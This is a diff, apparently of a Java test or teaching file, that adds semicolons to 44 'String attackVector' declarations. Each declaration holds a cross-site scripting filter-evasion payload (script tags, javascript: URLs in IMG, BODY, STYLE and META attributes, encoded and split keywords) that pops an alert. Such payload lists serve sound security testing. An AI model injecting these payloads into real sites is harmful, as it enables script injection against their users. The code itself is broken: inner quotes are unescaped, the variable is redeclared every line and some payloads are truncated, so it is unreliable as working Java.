@@ -1,44 +1,44 @@
-String attackVector = "<script>alert('CrossSiteScriptingAcademia')</script>"
-String attackVector = "<SCRIPT>alert('CrossSiteScriptingAcademia')</SCRIPT>"
-String attackVector = "<BASE HREF="javascript:alert('CrossSiteScriptingAcademia');//">"
-String attackVector = "<BGSOUND SRC="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<BODY BACKGROUND="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<BODY ONLOAD=alert('CrossSiteScriptingAcademia')>"
-String attackVector = "<DIV STYLE="background-image: url(javascript:alert('CrossSiteScriptingAcademia'))">"
-String attackVector = "<DIV STYLE="background-image: url(&amp;#1;javascript:alert('CrossSiteScriptingAcademia'))">"
-String attackVector = "<DIV STYLE="width: expression(alert('CrossSiteScriptingAcademia'));">"
-String attackVector = "<FRAMESET><FRAME SRC="javascript:alert('CrossSiteScriptingAcademia');"></FRAMESET>"
-String attackVector = "<IFRAME SRC="javascript:alert('CrossSiteScriptingAcademia');"></IFRAME>"
-String attackVector = "<INPUT TYPE="IMAGE" SRC="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC=javascript:alert('CrossSiteScriptingAcademia')>"
-String attackVector = "<IMG DYNSRC="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG LOWSRC="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("CrossSiteScriptingAcademia"))'>"
-String attackVector = "<IMG SRC='vbscript:msgbox("CrossSiteScriptingAcademia")'>"
-String attackVector = "<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f"
-String attackVector = "<IMG STYLE="xss:expr/*XSS*/ession(alert('CrossSiteScriptingAcademia'))">"
-String attackVector = "<XSS STYLE="xss:expression(alert('CrossSiteScriptingAcademia'))">"
-String attackVector = "<STYLE>.XSS{background-image:url("javascript:alert('CrossSiteScriptingAcademia')");}</STYLE><A CLASS=XSS></A>"
-String attackVector = "<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScriptingAcademia')")}</STYLE>"
-String attackVector = "<LINK REL="stylesheet" HREF="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<TABLE BACKGROUND="javascript:alert('CrossSiteScriptingAcademia')"></TABLE>"
-String attackVector = "<TABLE><TD BACKGROUND="javascript:alert('CrossSiteScriptingAcademia')"></TD></TABLE>"
-String attackVector = "<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScriptingAcademia')</SCRIPT>">"
-String attackVector = "<BR SIZE="&amp;{alert('CrossSiteScriptingAcademia')}">"
-String attackVector = "<IMG SRC=JaVaScRiPt:alert('CrossSiteScriptingAcademia')>"
-String attackVector = "<IMG SRC=javascript:alert(&amp;quot;CrossSiteScriptingAcademia&amp;quot;)>"
-String attackVector = "<IMG SRC=`javascript:alert("CrossSiteScriptingAcademia")`>"
-String attackVector = "</TITLE><SCRIPT>alert("CrossSiteScriptingAcademia");</SCRIPT>"
-String attackVector = "<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScriptingAcademia")';</STYLE>"
-String attackVector = "<IMG SRC="javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC="jav&amp;#x09;ascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC="jav&amp;#x0A;ascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC="jav&amp;#x0D;ascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC=" &amp;#14;javascript:alert('CrossSiteScriptingAcademia');">"
-String attackVector = "<IMG SRC="javascript:alert('CrossSiteScriptingAcademia')"
-String attackVector = "<SCRIPT>alert("CrossSiteScriptingAcademia");//<</SCRIPT>"
-String attackVector = "<IMG """><SCRIPT>alert("CrossSiteScriptingAcademia")</SCRIPT>">"
-String attackVector = "<SCRIPT>a=/CrossSiteScriptingAcademia/alert(a.source)</SCRIPT>"
+String attackVector = "<script>alert('CrossSiteScriptingAcademia')</script>";
+String attackVector = "<SCRIPT>alert('CrossSiteScriptingAcademia')</SCRIPT>";
+String attackVector = "<BASE HREF="javascript:alert('CrossSiteScriptingAcademia');//">";
+String attackVector = "<BGSOUND SRC="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<BODY BACKGROUND="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<BODY ONLOAD=alert('CrossSiteScriptingAcademia')>";
+String attackVector = "<DIV STYLE="background-image: url(javascript:alert('CrossSiteScriptingAcademia'))">";
+String attackVector = "<DIV STYLE="background-image: url(&amp;#1;javascript:alert('CrossSiteScriptingAcademia'))">";
+String attackVector = "<DIV STYLE="width: expression(alert('CrossSiteScriptingAcademia'));">";
+String attackVector = "<FRAMESET><FRAME SRC="javascript:alert('CrossSiteScriptingAcademia');"></FRAMESET>";
+String attackVector = "<IFRAME SRC="javascript:alert('CrossSiteScriptingAcademia');"></IFRAME>";
+String attackVector = "<INPUT TYPE="IMAGE" SRC="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC=javascript:alert('CrossSiteScriptingAcademia')>";
+String attackVector = "<IMG DYNSRC="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG LOWSRC="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("CrossSiteScriptingAcademia"))'>";
+String attackVector = "<IMG SRC='vbscript:msgbox("CrossSiteScriptingAcademia")'>";
+String attackVector = "<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f";
+String attackVector = "<IMG STYLE="xss:expr/*XSS*/ession(alert('CrossSiteScriptingAcademia'))">";
+String attackVector = "<XSS STYLE="xss:expression(alert('CrossSiteScriptingAcademia'))">";
+String attackVector = "<STYLE>.XSS{background-image:url("javascript:alert('CrossSiteScriptingAcademia')");}</STYLE><A CLASS=XSS></A>";
+String attackVector = "<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScriptingAcademia')")}</STYLE>";
+String attackVector = "<LINK REL="stylesheet" HREF="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<TABLE BACKGROUND="javascript:alert('CrossSiteScriptingAcademia')"></TABLE>";
+String attackVector = "<TABLE><TD BACKGROUND="javascript:alert('CrossSiteScriptingAcademia')"></TD></TABLE>";
+String attackVector = "<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScriptingAcademia')</SCRIPT>">";
+String attackVector = "<BR SIZE="&amp;{alert('CrossSiteScriptingAcademia')}">";
+String attackVector = "<IMG SRC=JaVaScRiPt:alert('CrossSiteScriptingAcademia')>";
+String attackVector = "<IMG SRC=javascript:alert(&amp;quot;CrossSiteScriptingAcademia&amp;quot;)>";
+String attackVector = "<IMG SRC=`javascript:alert("CrossSiteScriptingAcademia")`>";
+String attackVector = "</TITLE><SCRIPT>alert("CrossSiteScriptingAcademia");</SCRIPT>";
+String attackVector = "<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScriptingAcademia")';</STYLE>";
+String attackVector = "<IMG SRC="javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC="jav&amp;#x09;ascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC="jav&amp;#x0A;ascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC="jav&amp;#x0D;ascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC=" &amp;#14;javascript:alert('CrossSiteScriptingAcademia');">";
+String attackVector = "<IMG SRC="javascript:alert('CrossSiteScriptingAcademia')";
+String attackVector = "<SCRIPT>alert("CrossSiteScriptingAcademia");//<</SCRIPT>";
+String attackVector = "<IMG """><SCRIPT>alert("CrossSiteScriptingAcademia")</SCRIPT>">";
+String attackVector = "<SCRIPT>a=/CrossSiteScriptingAcademia/alert(a.source)</SCRIPT>";
